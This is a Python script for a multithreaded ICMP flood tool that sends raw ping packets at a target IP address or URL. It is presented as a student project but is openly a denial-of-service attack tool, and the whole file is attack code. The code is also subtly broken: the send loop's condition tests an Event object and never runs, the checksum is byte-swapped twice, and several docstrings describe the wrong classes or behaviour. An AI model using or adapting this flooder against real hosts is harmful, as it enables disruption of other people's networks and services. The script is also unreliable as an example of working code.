from argparse import ArgumentParser, Namespace
from socket import gethostbyname
from sys import argv, exit
from datetime import datetime
from logging import error, warning
from typing import Any, Dict, List
from struct import pack, error as PackException
from threading import Event, Thread, ThreadError
from time import time, sleep

from socket import (
    socket,
    htons,
    inet_aton,
    AF_INET,
    SOCK_RAW,
    IPPROTO_ICMP
)


class Flooder(Thread):
    """
    This class extends PyQt5.QtCore.QThread class which provides ability to launch
    run( method ) into own thread. This class build ICMP packet (header + body)
    and send to specified address:port.
    """

    def __init__(self, name: str, arguments: Dict[str, Any]):
        """
        The main Flooder constructor.

        Args:
            name (str): The current thread name.
            arguments (Dict[str, Any]): The dict with target info.

        """
        Thread.__init__(self, None)

        self.address = arguments.get('address')
        self.port_number = arguments.get('port')
        self.packet_length = arguments.get('length')
        self.sending_delay = arguments.get('delay')

        self.name = name
        self.shutdown_flag = Event()

    def _checksum(self, message) -> int:
        """
        This method returns the summary byte length of built ICMP-packet.

        Args:
        message (bytes): The byte array of ICMP-packet (header + body).

        Returns:
        int: The summary byte length.

        """

        summary = 0
        for index in range(0, len(message), 2):
            w = message[index] + (message[index + 1] << 8)
            summary = ((summary + w) & 0xffff) + ((summary + w) >> 16)
        return htons(~summary & 0xffff)

    def _construct_packet(self) -> bytes:
        """
        This method returns bytes of IMCP-packet (header + body).

        Returns:
        bytes: The summary bytes of ICMP-packet.

        """

        header = pack("bbHHh", 8, 0, 0, 1, 1)
        data_fmt = (self.packet_length - 50) * 'Q'
        data = pack("d", time()) + data_fmt.encode('ascii')
        header = pack("bbHHh", 8, 0, htons(self._checksum(header + data)), 1, 1)
        return header + data

    def run(self):
        """
        This method runs with another thread to create ICMP-packet and send it
        to specified target ip-address.

        Raise:
        PackException: throws while invoke pack() method failed.
        KeyboardInterrupt: throws while user send SIGKILL or SIGINT signal
            to stop all threads whose sending packets.

        """
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)

        try:
            inet_aton(self.address)
            while not self.shutdown_flag:
                packet = self._construct_packet()
                sock.sendto(packet, (self.address, self.port_number))
                sleep(self.sending_delay)

        except PackException as err:
            error(msg=f'Failed while trying pack msg: {err}')
            warning(msg=f'The {self.name} thread has not been interrupted!')

        except ThreadError as err:
            error(msg=f'Has been interrupted closing event. Closing all available threads: {err}')
            warning(msg=f'The {self.name} thread has been stopped!')

        except Exception as err:
            error(msg=f'Unknown runtime error into {self.name} thread!: {err}')

        finally:
            self.shutdown_flag.set()
            sock.close()


class FlooderRunner:
    """
    This class extends threading.Thread class which provides ability to run
    any class with another thread. This class runs flooding with another threads.
    """

    JOIN_TIMEOUT = 5

    def __init__(self, threads_number: int, arguments: Dict[str, Any]):
        """
        The FlooderRunner class constructor.

        Args:
            threads_number (int): The amount of target threads.
            arguments (Dict[str, Any]): The dict of arguments for Flooder class.

        """

        self.arguments = arguments
        self.threads_num = threads_number

        self._threads: List[Flooder] = []

    def _interrupt_threads(self):
        """
        This method interrupts all running threads.
        """
        for thread in self._threads:
            thread.shutdown_flag.set()
            thread.join(FlooderRunner.JOIN_TIMEOUT)

        self._threads.clear()

    def _launch_threads(self):
        """
        This method initializing multiple threads by passed threads number option.
        """
        for thread_iter in range(0, self.threads_num):
            thread = Flooder(name=f'thread-{thread_iter}', arguments=self.arguments)
            self._threads.append(thread)
            thread.start()

    def launch_flooder(self):
        """
        There is main method which runs with another thread to create ICMP-packet and send it
        to specified target ip-address.
        """

        try:
            start_time = datetime.now()
            self._launch_threads()
            while True:
                curr_time = datetime.now() - start_time
                print('Packets sending duration: {}'.format(curr_time), end='\r')

        except KeyboardInterrupt:
            warning(msg='\nHas been triggered keyboard interruption!')
            warning(msg='Terminating all running threads...')

        except Exception as err:
            error(msg=f'Has been caught unknown runtime error: {err}')

        finally:
            self._interrupt_threads()

def launch_cmd(cmd_options: Namespace):
    ip_address = gethostbyname(cmd_options.u) if cmd_options.u else cmd_options.i
    FlooderRunner(
        threads_number=cmd_options.t,
        arguments={
            'address': ip_address,
            'port': cmd_options.p,
            'delay': cmd_options.d,
            'length': cmd_options.l
        }
    ).launch_flooder()


argument_parser = ArgumentParser(
        prog='ICMP-Flooder',
        usage='''python3 icmpflood.py { gui | cmd [options] }
                    There are two modes to use this simple application:
                    1. gui  - Allows to run application with GUI interface;
                    2. cmd  - Run application into terminal (print -h for more details).
            ''',
        description='''
                    There is simple python script that i had been implemented while studying at the University.
                    The main goal of current project was being familiarization with python programming language.
                    And i decided to implement this simple python script that provides flooding ability by sending 
                    empty ICMP-packets to specified target by passed IP or URL-address. Also this script provides 
                    additional options as settings up packet length, frequency of sending generated ICMP-packets 
                    and threads amount. So you're welcome! :)
            ''',
        add_help=True,
        allow_abbrev=True
    )

sub_arg_parser = argument_parser.add_subparsers(title='Script Modes', dest='mode', required=True)
sub_arg_parser.add_parser('gui', help='Allows to run application with GUI interface.')
cmd_args = sub_arg_parser.add_parser('cmd', help='Run application into terminal (print -h for more details).')

cmd_args.add_argument('-u', metavar='--url', help='Target url-address', required=False, type=str)
cmd_args.add_argument('-i', metavar='--ip', help='Target ip-address', required=False, type=str)
cmd_args.add_argument('-p', metavar='--port', help='Target port number (for ip-address)',
                      required=False, choices=range(0, 65536), default=80, type=int)

cmd_args.add_argument('-t', metavar='--threads', help='Threads amount', required=False, default=1, type=int)
cmd_args.add_argument('-l', metavar='--length', help='Packet frame length', required=False, default=60, type=int)
cmd_args.add_argument('-d', metavar='--delay', help='Packet sending delay', required=False, default=0.1, type=float)

if __name__ == "__main__":
    arguments = argument_parser.parse_args()
    launch_cmd(arguments)